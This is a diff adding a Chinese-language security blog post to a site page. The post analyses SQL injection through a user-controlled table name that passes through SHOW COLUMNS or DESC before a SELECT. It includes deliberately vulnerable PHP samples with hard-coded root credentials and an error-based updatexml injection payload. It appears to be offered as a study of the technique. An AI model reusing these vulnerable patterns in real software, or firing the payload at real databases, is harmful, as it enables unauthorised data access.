@@ -63,6 +63,145 @@
 
   
     
+    <h3 class="article-title"><a href="/2017/04/16/当表名可控的注入遇到了Describe时的几种情况。/"><span>当表名可控的注入遇到了Describe时的几种情况。</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2017/04/16/当表名可控的注入遇到了Describe时的几种情况。/" rel="bookmark">
+        <time class="entry-date published" datetime="2017-04-16T13:52:13.000Z">
+          2017-04-16
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="SHOW-COLUMNS"><a href="#SHOW-COLUMNS" class="headerlink" title="SHOW COLUMNS"></a>SHOW COLUMNS</h2><p>之前小嘎嘎遇到了个注入是表前缀不可控,表名可控的注入,<br>但是在表名进入的select语句执行之前, 执行了一次SHOW COLUMNS FROM $TABLE。<br>如果SHOW COLUMNS语句执行出错了的话,<br>就不会再执行后面的SELECT语句。</p>
+<p>大概代码如:</p>
+<pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
+mysql_query(&quot;use b2cshop&quot;);
+$table = $_GET[&#39;table&#39;];
+mysql_query(&quot;show columns from `shop_&#123;$table&#125;`&quot;) or die(&quot;show coulumns 出错:&quot;.mysql_error());
+$sql = &quot;select * from `shop_&#123;$table&#125;` where 1=1&quot;;
+echo $sql;
+echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
+var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
+echo mysql_error();</code></pre>
+<p>要解这个, 首先来看一下 SHOW COLUMNS Syntax</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW [FULL] COLUMNS &#123;FROM | IN&#125; tbl_name [&#123;FROM | IN&#125; db_name]</span><br><span class="line">    [LIKE &#39;pattern&#39; | WHERE expr]</span><br></pre></td></tr></table></figure>
+
+<p>看到where 后面可以跟expr, 就很简单了。</p>
+<p><img src="http://onw16foqc.bkt.clouddn.com/14923471160467.jpg"></p>
+<hr>
+<p>解决了这个, 让我想起了我好多年前遇到的另外一种, 他不是用的show columns 而是用的describe, 当年的我没解决掉, 所以又再去看了一眼,试试能不能解决掉。 DESC这种分为几种情况。</p>
+<h2 id="DESCRIBE"><a href="#DESCRIBE" class="headerlink" title="DESCRIBE"></a>DESCRIBE</h2><blockquote>
+<p>DESCRIBE is a shortcut for SHOW COLUMNS. These statements also display information for views. The description for SHOW COLUMNS provides more information about the output columns.</p>
+</blockquote>
+<p>虽然说的是 DESCRIBE 是 SHOW COLUMNS 的shortcut,但是其实两个语法完全不同。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;EXPLAIN | DESCRIBE | DESC&#125;</span><br><span class="line">    tbl_name [col_name | wild]</span><br><span class="line"></span><br><span class="line">&#123;EXPLAIN | DESCRIBE | DESC&#125;</span><br><span class="line">    [explain_type]</span><br><span class="line">    &#123;explainable_stmt | FOR CONNECTION connection_id&#125;</span><br><span class="line"></span><br><span class="line">explain_type: &#123;</span><br><span class="line">    EXTENDED</span><br><span class="line">  | PARTITIONS</span><br><span class="line">  | FORMAT &#x3D; format_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">format_name: &#123;</span><br><span class="line">    TRADITIONAL</span><br><span class="line">  | JSON</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">explainable_stmt: &#123;</span><br><span class="line">    SELECT statement</span><br><span class="line">  | DELETE statement</span><br><span class="line">  | INSERT statement</span><br><span class="line">  | REPLACE statement</span><br><span class="line">  | UPDATE statement</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分几种情况来讨论。</p>
+<hr>
+<h3 id="0x01-表名完全可控且无identifier-quote。"><a href="#0x01-表名完全可控且无identifier-quote。" class="headerlink" title="0x01 表名完全可控且无identifier quote。"></a>0x01 表名完全可控且无identifier quote。</h3><pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
+mysql_query(&quot;use b2cshop&quot;);
+$table = $_GET[&#39;table&#39;];
+mysql_query(&quot;desc $table&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
+$sql = &quot;select * from &#123;$table&#125; where 1=1&quot;;
+echo $sql;
+echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
+var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
+echo mysql_error();</code></pre>
+<p>这种的,应该实例特别少。<br>利用比较简单, 根据文档写的构造一下, 直接利用desc 来注入。<br><img src="http://onw16foqc.bkt.clouddn.com/14923478923604.jpg"></p>
+<h3 id="0x02-表名不完全可控且DESC和SELECT的表名都含有identifier-quote"><a href="#0x02-表名不完全可控且DESC和SELECT的表名都含有identifier-quote" class="headerlink" title="0x02 表名不完全可控且DESC和SELECT的表名都含有identifier quote"></a>0x02 表名不完全可控且DESC和SELECT的表名都含有identifier quote</h3><p>一般都是遇到的这种注入,会有表前缀是不可控的。</p>
+<pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
+mysql_query(&quot;use b2cshop&quot;);
+$table = $_GET[&#39;table&#39;];
+mysql_query(&quot;desc `shop_&#123;$table&#125;`&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
+$sql = &quot;select * from `shop_&#123;$table&#125;` where 1=1&quot;;
+echo $sql;
+echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
+var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
+echo mysql_error();</code></pre>
+<p>这种想了很久, 我感觉是无解, 如果有大佬能搞定的话, 求学习。</p>
+<h3 id="0x03-表名不完全可控且DESC和SELECT的表名都不含有identifier-quote"><a href="#0x03-表名不完全可控且DESC和SELECT的表名都不含有identifier-quote" class="headerlink" title="0x03 表名不完全可控且DESC和SELECT的表名都不含有identifier quote"></a>0x03 表名不完全可控且DESC和SELECT的表名都不含有identifier quote</h3><pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
+mysql_query(&quot;use b2cshop&quot;);
+$table = $_GET[&#39;table&#39;];
+mysql_query(&quot;desc shop_&#123;$table&#125;&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
+$sql = &quot;select * from shop_&#123;$table&#125; where 1=1&quot;;
+echo $sql;
+echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
+var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
+echo mysql_error();</code></pre>
+<p>自我感觉,依旧无解。</p>
+<h4 id="0x04-表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote"><a href="#0x04-表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote" class="headerlink" title="0x04 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote"></a>0x04 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote</h4><pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
+mysql_query(&quot;use b2cshop&quot;);
+$table = $_GET[&#39;table&#39;];
+mysql_query(&quot;desc `shop_&#123;$table&#125;`&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
+$sql = &quot;select * from shop_&#123;$table&#125; where 1=1&quot;;
+echo $sql;
+echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
+var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
+echo mysql_error();</code></pre>
+<p>可解,<br><img src="http://onw16foqc.bkt.clouddn.com/14923490866702.jpg"></p>
+<p>shop_users 后面的两个``,做了shop_users 表的别名,所以无影响。<br>这时候desc的语句为,</p>
+<pre><code>desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`</code></pre>
+<p>看一下DESC的Syntax   </p>
+<pre><code>DESC tbl_name [col_name | wild]</code></pre>
+<p>可以看到表名后面可以接col_name 或者 wild<br>为什么表名后面接了where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)# 却没有报unknown column,<br>感觉是因为这个应该是按照wild来执行的,</p>
+<blockquote>
+<p>wild, if given, is a pattern string. It can contain the SQL % and _ wildcard characters.</p>
+</blockquote>
+<p>所以不会报unknown column。</p>
+<h4 id="0x05-表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote"><a href="#0x05-表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote" class="headerlink" title="0x05 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote"></a>0x05 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</h4><p>跟上面一个利用差不多,稍微改一下。</p>
+<pre><code>    mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
+    mysql_query(&quot;use b2cshop&quot;);
+    $table = $_GET[&#39;table&#39;];
+    mysql_query(&quot;desc shop_&#123;$table&#125;&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
+    $sql = &quot;select * from `shop_&#123;$table&#125;` where 1=1&quot;;
+    echo $sql;
+    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
+    var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
+    echo mysql_error();</code></pre>
+<p><img src="http://onw16foqc.bkt.clouddn.com/14923497093942.jpg"></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Web/">Web</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2017/04/11/为什么-backtick-能做注释符/"><span>为什么`(backtick)能做&amp;quot;注释符&amp;quot;</span></a></h3>
     
   
